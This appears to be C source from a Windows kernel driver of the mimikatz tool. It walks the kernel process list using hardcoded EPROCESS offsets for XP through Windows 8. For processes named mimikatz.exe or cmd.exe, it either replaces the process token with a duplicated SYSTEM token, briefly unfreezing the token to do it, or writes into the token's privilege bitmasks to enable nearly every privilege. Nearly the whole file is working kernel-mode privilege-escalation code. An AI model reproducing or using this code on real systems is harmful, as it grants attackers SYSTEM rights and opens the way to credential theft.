#include "processes.h"

const ULONG EPROCESS_OffSetTable[MAX_OS_LEN][MAX_EPROCESS_LEN] =
{
				/*  INDEX_EPROCESS_NEXT, INDEX_EPROCESS_FLAGS2, INDEX_TOKEN_PRIVS */
#ifdef _M_IX86
/* INDEX_UNK	*/	{0x0000, 0x0000, 0x0000},
/* INDEX_XP		*/	{0x0088, 0x0000, 0x0000},
/* INDEX_2K3	*/	{0x0098, 0x0000, 0x0000},
/* INDEX_VISTA	*/	{0x00a0, 0x0224, 0x0040},
/* INDEX_2K8	*/	{0x00a0, 0x0224, 0x0040},
/* INDEX_7		*/	{0x00b8, 0x026c, 0x0040},
/* INDEX_2K8R2	*/	{0x0000, 0x0000, 0x0000},/* n'existe pas ! */
/* INDEX_8		*/	{0x00b8, 0x00c0, 0x0040}
#else
/* INDEX_UNK	*/	{0x0000, 0x0000, 0x0000},
/* INDEX_XP		*/	{0x0000, 0x0000, 0x0000},/* n'existe pas, XP x64 *est* 2003 x64 */
/* INDEX_2K3	*/	{0x00e0, 0x0000, 0x0000},
/* INDEX_VISTA	*/	{0x00e8, 0x036c, 0x0040},
/* INDEX_2K8	*/	{0x00e8, 0x036c, 0x0040},
/* INDEX_7		*/	{0x0188, 0x043c, 0x0040},
/* INDEX_2K8R2	*/	{0x0188, 0x043c, 0x0040},
/* INDEX_8		*/	{0x02e8, 0x02f8, 0x0040}
#endif
};

NTSTATUS sysToken(LPWSTR pszDest, size_t cbDest, LPWSTR *ppszDestEnd, size_t *pcbRemaining)
{
	return listProcessesOrSysToken(pszDest, cbDest, ppszDestEnd, pcbRemaining, ExchangeToken);
}

NTSTATUS listProcesses(LPWSTR pszDest, size_t cbDest, LPWSTR *ppszDestEnd, size_t *pcbRemaining)
{
	return listProcessesOrSysToken(pszDest, cbDest, ppszDestEnd, pcbRemaining, ListProcesses);
}

NTSTATUS privProcesses(LPWSTR pszDest, size_t cbDest, LPWSTR *ppszDestEnd, size_t *pcbRemaining)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
	
	if(INDEX_OS >= INDEX_VISTA)
		status = listProcessesOrSysToken(pszDest, cbDest, ppszDestEnd, pcbRemaining, FullPrivilegeNT6);

	return status;
}

NTSTATUS listProcessesOrSysToken(LPWSTR pszDest, size_t cbDest, LPWSTR *ppszDestEnd, size_t *pcbRemaining, KIWI_EPROCESS_ACTION action)
{
	NTSTATUS status = STATUS_SUCCESS, status2 = STATUS_SUCCESS;
	PEPROCESS monProcess = NULL;
	PCHAR processName = NULL;
	HANDLE processId = NULL;
	
	PACCESS_TOKEN monTokenAcess = NULL;
	PKIWI_NT6_PRIVILEGES mesPrivileges = NULL;
	
	HANDLE sysProcessHandle, sysProcessTokenHandle, newSysTokenHandle, processHandle;
	PROCESS_ACCESS_TOKEN ProcessTokenInformation;
	PULONG pFlags2 = NULL;
	
	*ppszDestEnd = pszDest; *pcbRemaining= cbDest;
	
	for(
		monProcess = PsInitialSystemProcess;
		NT_SUCCESS(status) &&
		(PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) monProcess) + EPROCESS_OffSetTable[INDEX_OS][INDEX_EPROCESS_NEXT]))- EPROCESS_OffSetTable[INDEX_OS][INDEX_EPROCESS_NEXT]) != PsInitialSystemProcess;
		monProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) monProcess) + EPROCESS_OffSetTable[INDEX_OS][INDEX_EPROCESS_NEXT]))- EPROCESS_OffSetTable[INDEX_OS][INDEX_EPROCESS_NEXT])
		)
	{
		processName = PsGetProcessImageFileName(monProcess);
		processId = PsGetProcessId(monProcess);
		
		if(action == ExchangeToken || action == FullPrivilegeNT6)
		{
			if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7))
			{
				status = RtlStringCbPrintfExW(*ppszDestEnd, *pcbRemaining, ppszDestEnd, pcbRemaining, STRSAFE_NO_TRUNCATION,
								L"processes::ExchangeToken/FullPrivilegeNT6 \'%S' trouvé :) - PID %u\n", processName, processId
								);
				if(action == ExchangeToken)
				{
					status2 = ObOpenObjectByPointer(PsInitialSystemProcess, OBJ_KERNEL_HANDLE, NULL, GENERIC_READ, *PsProcessType, KernelMode, &sysProcessHandle);
					if(NT_SUCCESS(status2))
					{
						status2 = ObOpenObjectByPointer(monProcess, OBJ_KERNEL_HANDLE, NULL, GENERIC_WRITE, *PsProcessType, KernelMode, &processHandle);
						if(NT_SUCCESS(status2))
						{
							status2 = ZwOpenProcessTokenEx(sysProcessHandle, TOKEN_DUPLICATE, OBJ_KERNEL_HANDLE, &sysProcessTokenHandle);
							if(NT_SUCCESS(status2))
							{
								status2 = ZwDuplicateToken(sysProcessTokenHandle, TOKEN_ASSIGN_PRIMARY, NULL, FALSE, TokenPrimary, &newSysTokenHandle);
								if(NT_SUCCESS(status2))
								{
									ProcessTokenInformation.Token = newSysTokenHandle;
									ProcessTokenInformation.Thread = 0;
									
									if(INDEX_OS >= INDEX_VISTA)
									{
										pFlags2 = (PULONG) (((ULONG_PTR) monProcess) + EPROCESS_OffSetTable[INDEX_OS][INDEX_EPROCESS_FLAGS2]);
										*pFlags2 &= ~TOKEN_FROZEN_MASK;
									}
									
									status2 = ZwSetInformationProcess(processHandle, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
									if(NT_SUCCESS(status2))
									{
										status = RtlStringCbPrintfExW(*ppszDestEnd, *pcbRemaining, ppszDestEnd, pcbRemaining, STRSAFE_NO_TRUNCATION, L"\nToken échangé :)\n");
									}
									
									if(INDEX_OS >= INDEX_VISTA)
									{
										*pFlags2 |= TOKEN_FROZEN_MASK;
									}
									
									ZwClose(newSysTokenHandle);
								}
								ZwClose(sysProcessTokenHandle);
							}
							ZwClose(processHandle);
							ZwClose(sysProcessHandle);
						}
					}
				}
				else
				{
					if(monTokenAcess = PsReferencePrimaryToken(monProcess))
					{
						mesPrivileges = (PKIWI_NT6_PRIVILEGES) (((ULONG_PTR) monTokenAcess) + EPROCESS_OffSetTable[INDEX_OS][INDEX_TOKEN_PRIVS]);

						mesPrivileges->Present[0] = mesPrivileges->Enabled[0] /*= mesPrivileges->EnabledByDefault[0]*/ = 0xfc;
						mesPrivileges->Present[1] = mesPrivileges->Enabled[1] /*= mesPrivileges->EnabledByDefault[1]*/ = //...0xff;
						mesPrivileges->Present[2] = mesPrivileges->Enabled[2] /*= mesPrivileges->EnabledByDefault[2]*/ = //...0xff;
						mesPrivileges->Present[3] = mesPrivileges->Enabled[3] /*= mesPrivileges->EnabledByDefault[3]*/ = 0xff;
						mesPrivileges->Present[4] = mesPrivileges->Enabled[4] /*= mesPrivileges->EnabledByDefault[4]*/ = 0x0f;
					
						PsDereferencePrimaryToken(monTokenAcess);
					}
				}
			}
		}
		else
		{
			status = RtlStringCbPrintfExW(*ppszDestEnd, *pcbRemaining, ppszDestEnd, pcbRemaining, STRSAFE_NO_TRUNCATION, L"%u\t%S\n", processId, processName);
		}
	}
	return status;	
}